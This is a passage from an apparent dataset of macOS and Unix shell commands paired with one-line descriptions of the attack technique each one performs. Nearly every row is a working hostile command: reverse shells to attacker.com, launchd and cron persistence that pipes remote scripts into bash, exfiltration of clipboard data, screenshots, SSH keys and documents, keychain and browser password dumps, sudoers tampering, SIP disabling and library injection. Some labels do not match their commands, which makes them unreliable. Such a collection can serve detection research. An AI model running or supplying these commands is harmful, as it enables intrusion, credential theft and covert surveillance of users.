	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.mykeylogger.agent.plist && launchctl load ~/Library/LaunchAgents/com.mykeylogger.agent.plist","Persistence of a keylogger by modifying launchd services."
"echo '#!/bin/bash
while true; do
 security find-generic-password -wa """" 2>&1 > /tmp/credentials.txt
 sleep 300
done' > ~/Library/Scripts/credentialHarvester.sh && chmod +x ~/Library/Scripts/credentialHarvester.sh && ~/Library/Scripts/credentialHarvester.sh &","Interception of login credentials using a malicious shell script."
"echo '#!/bin/bash
while true; do
 pbpaste > /tmp/clipboard.txt
 curl -X POST -F ""file=@/tmp/clipboard.txt"" http://attacker.com/upload
 sleep 60
done' > ~/Library/Scripts/clipboardMonitor.sh && chmod +x ~/Library/Scripts/clipboardMonitor.sh && ~/Library/Scripts/clipboardMonitor.sh &","Capturing clipboard data periodically and sending it to a remote server."
"while read -r line; do echo $line | nc -w1 attacker.com 4444; done < /dev/input/event0","Data exfiltration through keylogging to capture user input events and record application usage."
"echo '*/5 * * * * /usr/bin/python /tmp/rootkit.py' | sudo crontab -","Privilege escalation by injecting malicious code into root's crontab for persistence."
"find / -perm -4002 -type f -exec ls -la {} \;","Privilege escalation by finding and exploiting world-writable setuid files."
"ps aux | grep 'process_name' | awk '{print $2}' | xargs kill -9","Malicious shell command that enumerates running processes and selects specific ones to terminate, potentially disrupting critical system services."
"open -a /Applications/Mail.app /path/to/malicious/payload.eml && osascript -e 'tell application ""Mail"" to open (get mail attachments of incoming message 1 whose name is ""payload.zip"")' && unzip ~/Downloads/payload.zip -d ~/Library/ && chmod +x ~/Library/payload.app/Contents/MacOS/payload && ~/Library/payload.app/Contents/MacOS/payload","Infection of a macOS system by executing a malicious payload received through a phishing email."
"osascript -e 'do shell script ""launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib"" with administrator privileges'","Privilege escalation by injecting code into privileged processes on macOS systems."
"echo 'echo ""rootmydevice"" | sudo -S /usr/bin/kextload /tmp/exploit.kext' > /tmp/execute.sh && chmod +x /tmp/execute.sh && /tmp/execute.sh","Executing a kernel exploit payload to gain unauthorized access."
"csrutil disable","Bypassing System Integrity Protection (SIP) to perform restricted operations."
"while true; do rsync -a --exclude '.DS_Store' /Volumes/USBDrive/ user@remote-server:/path/to/backup; sleep 300; done","Malicious script that monitors the file system for changes and copies newly added files to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.reverse.shell</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via launchd to establish a reverse shell on system startup."
"curl -s http://compromised-website.com/trojan.pkg > /tmp/trojan.pkg && installer -pkg /tmp/trojan.pkg -target /","A scenario where a trojan application is installed on a macOS system through a compromised website."
"zip -r .hidden.zip ~/Documents/.hidden && mv .hidden.zip ~/Pictures/.image.jpg","Compressing sensitive files in a hidden directory before exfiltration."
"cat ~/Pictures/.image.jpg ~/Documents/.hidden.zip > ~/Pictures/transfer_image.jpg","Hiding files in image metadata for stealthy information transfer."
"curl -F 'media=@/Pictures/transfer_image.jpg' 'https://upload.twitter.com/1.1/media/upload.json' -H 'Authorization: Bearer [ACCESS_TOKEN]'","Uploading a file to a social media platform using curl for data exfiltration."
"echo ""*/30 * * * * /usr/bin/curl http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Persistence mechanism using a cron job to download and execute a script from a remote server on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to establish a reverse shell on system boot."
"scp ~/.ssh/id_rsa user@malicious-server.com:/path/to/store/keys","Data exfiltration by sending local SSH private keys to a remote server."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Setting up remote access by creating a reverse shell using bash."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n	<key>Label</key>\n	<string>com.malicious.agent</string>\n	<key>ProgramArguments</key>\n	<array>\n		<string>/usr/bin/curl</string>\n		<string>-fsSL</string>\n		<string>http://malicious-url.com/payload.sh</string>\n		<string>|</string>\n		<string>/bin/bash</string>\n	</array>\n	<key>RunAtLoad</key>\n	<true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a persistent backdoor by adding a launch agent."
"echo ""0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh"" | crontab -","Persistence via a malicious cron job that downloads and executes a script every hour."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script"", hidden:false}'","Persistence by adding a malicious script to login items."
"sudo dscl . -create /Users/hiddenadmin && sudo dscl . -create /Users/hiddenadmin UserShell /bin/bash && sudo dscl . -create /Users/hiddenadmin RealName 'Hidden Admin' && sudo dscl . -create /Users/hiddenadmin UniqueID '999' && sudo dscl . -create /Users/hiddenadmin PrimaryGroupID 80 && sudo dscl . -create /Users/hiddenadmin NFSHomeDirectory /var/hiddenadmin && sudo dscl . -passwd /Users/hiddenadmin password && sudo dscl . -append /Groups/admin GroupMembership hiddenadmin","Establishing unauthorized system access by creating a hidden admin user."
"sudo launchctl load -w /Library/LaunchDaemons/com.malicious.daemon.plist","Daemon registration to maintain persistence after reboot."
"script -q /dev/null | tee ~/Library/Logs/user_activity.log","Tracking user activity by logging every command entered in the terminal."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via login item added to a user's Login Items list using AppleScript."
"echo 'int main() { system(""launchctl load /Library/LaunchDaemons/com.malicious.plist""); return 0; }' > malicious.c && gcc -dynamiclib -o libmalicious.dylib malicious.c && sudo DYLD_INSERT_LIBRARIES=./libmalicious.dylib /usr/bin/someprivilegedprocess","Injecting code into privileged processes can be achieved by creating a malicious dynamic library and using DYLD_INSERT_LIBRARIES to preload it."
"sudo sed -i '' 's|</dict>|<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>nohup curl -fsSL http://malicious-url.com/payload.sh | sh</string></array></dict>|' /Library/LaunchDaemons/com.apple.someexistingdaemon.plist","Manipulating system daemons to execute arbitrary code can be done by altering existing plist files in the LaunchDaemons directory."
"echo 'username ALL=(ALL) NOPASSWD:ALL' | sudo EDITOR='tee -a' visudo","Tampering with the sudoers file to grant no-password sudo access to a specific user can be done by editing the sudoers file directly."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/payload</string>
		<string>http://malicious-url.com/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load -w ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a malicious Launch Agent to execute a payload every time the user logs in."
"osascript -e 'do shell script ""chmod 6777 /path/to/vulnerable/kernel/module"" with administrator privileges'","Privilege escalation by exploiting a race condition vulnerability in a macOS kernel module."
"tar -czvf /tmp/documents_backup.tar.gz ~/Documents/SensitiveData/ && curl --upload-file /tmp/documents_backup.tar.gz http://attacker-server.com/upload","Compressing and exfiltrating sensitive documents from a macOS system using a scheduled job."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.clipboard.monitor</string><key>ProgramArguments</key><array><string>/usr/bin/env</string><string>sh</string><string>-c</string><string>while :; do pbpaste | nc -w 1 attacker.com 1337; sleep 10; done</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.clipboard.monitor.plist && launchctl load ~/Library/LaunchAgents/com.clipboard.monitor.plist","Persistence via clipboard monitoring script added to launch agents."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/HiddenMalware.app"", hidden:true}'","Persistence via login item addition using AppleScript to execute a hidden malware application."
"curl -s http://malicious-url.com/fakeupdate.pkg > /tmp/fakeupdate.pkg && installer -pkg /tmp/fakeupdate.pkg -target /","Malware installation through a trojanized application disguised as a legitimate software update."
"sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data 'select origin_url, username_value, password_value from logins' > ~/credentials.txt","Credential harvesting script that searches for and extracts login information from the default browser."
"security dump-keychain -d login.keychain > ~/keychain_dump.txt","Keychain dump command to extract and store passwords and secure notes from the user's keychain."
"curl -o ~/Library/Updates/update.sh http://malicious-url.com/update.sh && chmod +x ~/Library/Updates/update.sh && ~/Library/Updates/update.sh","Malware installation using a disguised script downloaded from the internet."
"echo 'while true; do cat /dev/input/event0 | nc -l 4444; done' > ~/Library/Keyloggers/keyboard-logger.sh && chmod +x ~/Library/Keyloggers/keyboard-logger.sh && nohup ~/Library/Keyloggers/keyboard-logger.sh &","Injection of a keylogger into an application to capture user keystrokes."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo","Gaining access to privileged files by modifying the sudoers file."
"zip -r /tmp/Documents.zip ~/Documents && curl --upload-file /tmp/Documents.zip http://attacker.com/upload","Data exfiltration by compressing and sending the Documents directory to a remote server."
"echo '* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /tmp/crontab && crontab /tmp/crontab","Setting up remote access by installing a reverse shell in the system's crontab."
"sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -privs -all -restart -agent -menu","Exploiting RDP vulnerabilities by enabling remote desktop access with system privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist file that executes a script every time the user logs in."
"chmod +s /bin/bash","Privilege escalation by exploiting SUID bit on a binary to run a shell with root privileges."
"chmod 777 /etc/shadow","Manipulating file permissions to grant everyone full access to a sensitive file."
"auditctl -e 0","Disabling file access auditing to prevent detection of unauthorized file operations."
"echo 'echo ""malicious code""' >> /usr/local/bin/authorized_binary","Injecting code into an authorized binary to execute arbitrary commands."
"osascript -e 'do shell script ""echo \""launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib\"" >> /Library/LaunchDaemons/com.apple.windowserver.plist"" with administrator privileges'","Privilege escalation by injecting code into privileged processes through system daemon manipulation using launchd plist modification."
"while true; do screencapture -x ~/Desktop/screenshot.png; curl -T ~/Desktop/screenshot.png ftp://attacker.com/uploads/; sleep 300; done","Automating screen capture and exfiltrating data to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.micmonitor.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/Users/Shared/micmonitor.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.micmonitor.agent.plist && launchctl load ~/Library/LaunchAgents/com.micmonitor.agent.plist","Persistence via malicious plist to enable microphone access for remote monitoring."
"curl -s http://malicious-url.com/audkeylogger.sh | bash","Keylogging with audio analysis to capture keystrokes and ambient sound."
"curl -s http://example.com/malicious_script.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"echo 'sudo kextload /Library/Extensions/malicious.kext' >> ~/.bash_profile","Rootkit embedding by appending a malicious load command to the system's bash_profile."
"DYLD_INSERT_LIBRARIES=/path/to/malicious_library.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp","Process hooking to monitor and manipulate system calls by injecting code into a running process."
"nc -l 9999 | sh","Creating a stealth network listener that accepts remote commands."
"osascript -e 'do shell script ""echo 'while :; do; curl -fsSL http://malicious-url.com/payload.sh | bash; sleep 300; done' > /Library/ScriptingAdditions/.hidden.sh && chmod +x /Library/ScriptingAdditions/.hidden.sh && echo 'launchctl load /Library/ScriptingAdditions/.hidden.sh' >> /Applications/SomeApp.app/Contents/Info.plist"" with administrator privileges'","Persistence via scripting additions where a malicious script is loaded every time an application is launched."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/path/to/malicious/script"", hidden:false}'","Persistence mechanism using scripting additions to load a malicious script at login."
"curl -s http://example.com/malicious-script.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation using a disguised Bash script downloaded from the internet."
"echo 'echo ""Malicious code""' >> /usr/local/bin/somebinary","Rootkit embedding by appending code to an existing system binary."
"csrutil disable","Bypassing system integrity protection to modify protected files."
"nvram boot-args=""kext-dev-mode=1 rootless=0""","Disabling system integrity checks on boot."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.reverse.shell</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via launch agent to establish a reverse shell on system startup."
"echo '0 * * * * curl -s http://malicious-url.com/script.sh | sh' | crontab -","Persistence via cron job to download and execute a script every hour."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist by loading it with launchctl."
"echo 'SITE CHMOD 777 /sensitive/data' | ftp anonymous@victim-ftp-server.com","Gaining unauthorized access to an FTP server due to misconfigured permissions allowing anonymous write access."
"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && launchctl stop com.openssh.sshd && launchctl start com.openssh.sshd","Modifying the SSH daemon configuration to enable unauthorized remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist in LaunchAgents for ongoing control."
"curl -o ~/Library/.hidden_keylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hidden_keylogger && echo '@reboot /bin/bash ~/Library/.hidden_keylogger' | crontab -","Persistence via keylogger installation in macOS."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Configuring a remote access tool on a macOS system."
"echo '*/30 * * * * curl -fsSL http://malicious-url.com/script.sh | /bin/bash' | crontab -","Creating a cron job to execute a script from an external source on macOS."
"curl -s http://example.com/malicious/installer.sh | /bin/bash","Malware installation using a disguised script downloaded from the internet."
"osascript -e 'Tell application ""System Events"" to display dialog ""System Update Required"" default answer """" with hidden answer'","Phishing attack script that masquerades as a legitimate system alert to capture user input."
"python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((""attacker.com"", 1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([""/bin/sh"",""-i""]);'","Keylogging script that captures keystrokes and sends them to a remote server."
"log stream --predicate 'eventMessage contains ""input""' > /tmp/system.log &","Script that enables system logging to monitor user activities covertly."
"curl -s http://malicious-url.com/install.sh > /tmp/install.sh && chmod +x /tmp/install.sh && /tmp/install.sh","Malware installation using a disguised script downloaded from the internet."
"cat /tmp/malicious_code >> /usr/bin/legitimate_binary && chmod +x /usr/bin/legitimate_binary","Rootkit embedding by injecting code into system binaries."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Achieving boot persistence by adding a script to login items."
"sudo nvram boot-args=""kext-dev-mode=1"" && sudo kextload /tmp/unsigned.kext","Kernel extension manipulation to load an unsigned kext."
"curl -s http://malicious-url.com/fakeupdate.sh | sh","Malware installation via a disguised Bash script that appears to be a legitimate software update."
"osascript -e 'tell application ""Mail"" to send (make new outgoing message with properties {subject:""Account Verification Required"", content:""Please verify your account at http://phishing-url.com"", visible:true})'","Phishing attack script that sends spoofed emails to extract credentials from the recipient."
"grep -roP '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' /Users/ > ~/Desktop/harvested_emails.txt","Email harvesting from the local machine to find potential targets for a phishing campaign."
"dig +short -x attacker-ip-address | tee ~/Desktop/related_domains.txt","Domain search tool execution to identify related domains for a targeted phishing attack."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/app"", hidden:false}'","Persistence via malicious login item added to a user's login items."
"echo 'int main() { setuid(0); system(""/bin/sh""); return 0; }' > priv_esc.c && gcc -o priv_esc priv_esc.c && sudo DYLD_INSERT_LIBRARIES=./priv_esc.dylib /usr/bin/sudo","Privilege escalation by exploiting sudo misconfigurations that allow environment variable manipulation."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/RemoteAccessTool.app"", hidden:false}'","Persistence via login item addition for remote access tool execution."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to log keystrokes"
"screencapture -x ~/Desktop/screenshot.jpg","Screen activity recording with native macOS tools"
"osascript -e 'tell application ""System Events"" to do shell script ""sudo killall AppleCameraAssistant; sudo killall VDCAssistant; ffmpeg -f avfoundation -i ""0"" -vframes 1 ~/Desktop/photo.jpg""'","Webcam access manipulation to take photos without user consent"
"osascript -e 'set cmd to ""ffmpeg -f avfoundation -i \""0\"" -vframes 1 ~/Desktop/snapshot.jpg""' -e 'do shell script cmd'","Accessing the webcam on macOS systems for remote monitoring."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.task</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.task.plist && launchctl load ~/Library/LaunchAgents/com.malicious.task.plist","Persistence via malicious plist file that executes a script every 5 minutes."
"find ~/Documents -name '*.pdf' -exec echo 'Subject: Sensitive Data' | (cat - && uuencode {} {}) | ssmtp recipient@example.com \;","Malicious command to automatically email sensitive information from a macOS system using an automated script."
"ps aux | grep -i 'security_monitoring_tool_name'","A scenario where a malicious actor attempts to enumerate running processes to identify security monitoring tools."
"pkill -f 'security_process_name'","An instance where an unauthorized user tries to terminate a known security process."
"kextload /path/to/malicious_kernel_extension.kext","A case where a rootkit is used to hide its process from the process list."
"DYLD_INSERT_LIBRARIES=/path/to/malicious_library.dylib /usr/bin/sudo","Privilege escalation by injecting code into privileged processes through dynamic library hijacking."
"while true; do ps aux -o command | grep DYLD_INSERT_LIBRARIES; sleep 5; done","Process monitoring to detect code injection attempts on macOS."
"mkdir /etc/.hidden && echo '*/30 * * * * curl -fsSL http://malicious-url.com/script.sh | sh' > /etc/.hidden/.crontab && crontab /etc/.hidden/.crontab","Persistence on macOS by adding a hidden cron job in a system directory to execute a script from a remote server."
"sqlite3 ~/Library/Safari/History.db 'select url from history_items' > ~/Desktop/safari_history.txt && cp ~/Library/Safari/Bookmarks.plist ~/Desktop/safari_bookmarks.plist","Extracting web browsing history and bookmarks from a macOS system."
"osascript -e 'do shell script ""echo \""malicious_code\"" > /tmp/malicious_file"" with administrator privileges'","Injecting code into a privileged process to gain elevated access."
"osascript -e 'do shell script ""echo \""while :; do echo Malicious Activity; sleep 5; done\"" | bash &"" with administrator privileges'","Malicious process creation by injecting code into an existing process using macOS's built-in tools."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Users/$(whoami)/.hidden/evil_script.sh"", hidden:true}'","Persistence via login item added to a user's login items that executes a script from a hidden directory."
"scp ~/.ssh/id_rsa user@remote-server.com:~/stolen_keys/","Exfiltrating SSH private keys to a remote server."
"bash -i >& /dev/tcp/remote-server.com/4444 0>&1","Establishing a reverse shell to maintain remote access."
"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && launchctl stop com.openssh.sshd && launchctl start com.openssh.sshd","Modifying the SSH configuration to enable unauthorized access."
"curl -s http://malicious-url.com/installer.sh | /bin/bash","Malware installation through a drive-by download exploiting Safari browser vulnerabilities."
"while :; do screencapture -x ~/Library/Caches/screenshot-$(date +%s).png; sleep 300; done & curl -T ~/Library/Caches/screenshot-*.png ftp://attacker.com/uploads/","Automated screen capture for data exfiltration on a macOS system."
"echo 'char *p = 0; *p = 0;' > panic.c && gcc -o panic panic.c && ./panic","Privilege escalation by exploiting race conditions in macOS kernel to induce a kernel panic"
"sudo chown $(whoami) /etc/sudoers && echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && sudo chown root /etc/sudoers","Privilege escalation by changing the ownership of sensitive system files to grant unrestricted access."
"cp /usr/bin/env /tmp/; chmod u+s /tmp/env","Privilege escalation by exploiting a setuid-enabled binary on macOS."
"DYLD_LIBRARY_PATH=/path/to/malicious/libraries /path/to/application","Hijacking library paths to load malicious code during the execution of a legitimate macOS application."
"export LD_PRELOAD=/path/to/malicious/library.so; /path/to/legitimate/binary","LD_PRELOAD exploitation to execute arbitrary code by preloading a malicious shared library."
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","Persistence via cron job to download and execute a script every hour"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious</string>
		<string>http://malicious-url.com/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence mechanism using a malicious Launch Daemon on macOS."
"echo '*/30 * * * * /usr/bin/python /tmp/.hidden_payload.py' >> /etc/crontab","Privilege escalation by injecting code into existing cron jobs on a macOS system."
"echo 'Hide from ps' > /tmp/.hidden && launchctl submit -l com.hidden.process -- /usr/bin/env sh -c 'while true; do ps aux | grep -v grep | grep -v -f /tmp/.hidden; sleep 60; done'","Persistence via malicious plist modification to hide processes."
"ps aux | grep -v 'process_name' > /tmp/.hidden_process_list && mv /tmp/.hidden_process_list /tmp/.hidden_process_list_backup && ps aux > /tmp/.hidden_process_list","Malicious command to hide a process from the process list on a macOS system."
"open '/path/to/malicious_attachment.pdf'","Malware installation by executing a malicious payload received via email attachment."
"rar a -v10M -R sensitive_files.rar /path/to/sensitive/data/*","Compressing sensitive files into split archives using rar on a macOS system."
"top -l 1 | grep 'process_name' > /tmp/process_details.txt","Extracting specific process details from system monitoring using top command scripting."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via login item added to a user's login items list."
"sudo kextload /Library/Extensions/malicious.kext","Loading a malicious kernel extension without user consent."
"echo ""*/30 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Establishing a cron job to periodically execute a malicious script."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.sniffer.startup</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/sudo</string>
 <string>/usr/sbin/tcpdump</string>
 <string>-i</string>
 <string>en0</string>
 <string>-w</string>
 <string>/tmp/capture.pcap</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.sniffer.startup.plist && launchctl load ~/Library/LaunchAgents/com.sniffer.startup.plist","Persistence via malicious plist to initiate a network traffic sniffer on system startup"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger on system startup."
"curl -s http://malicious-url.com/fakeinstaller.pkg -o /tmp/fakeinstaller.pkg && installer -pkg /tmp/fakeinstaller.pkg -target /","Malware installation using a trojan application disguised as a legitimate software package on macOS."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | tee ~/Library/.hidden_reverse_shell && echo 'alias startserver=""bash ~/Library/.hidden_reverse_shell""' >> ~/.bash_profile","Establishing remote access on a macOS system by installing a hidden reverse shell."
"curl -s http://malicious-url.com/keylogger -o /tmp/.keylogger && chmod +x /tmp/.keylogger && nohup /tmp/.keylogger > /dev/null 2>&1 &","Implementing a keylogger on macOS to capture and exfiltrate keystrokes to a remote server."
"*/1 * * * * /bin/bash -c ""$(curl -fsSL http://malicious-url.com/script.sh)""","Persistence via cron job to execute a script from a remote server every minute"
"osascript -e 'do shell script ""curl -fsSL http://malicious-url.com/payload.sh | bash"" with administrator privileges'","Persistence via scripting additions in macOS by executing a malicious script at login."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/remote.sh | bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing a backdoor through a launch daemon that executes a remote shell script."
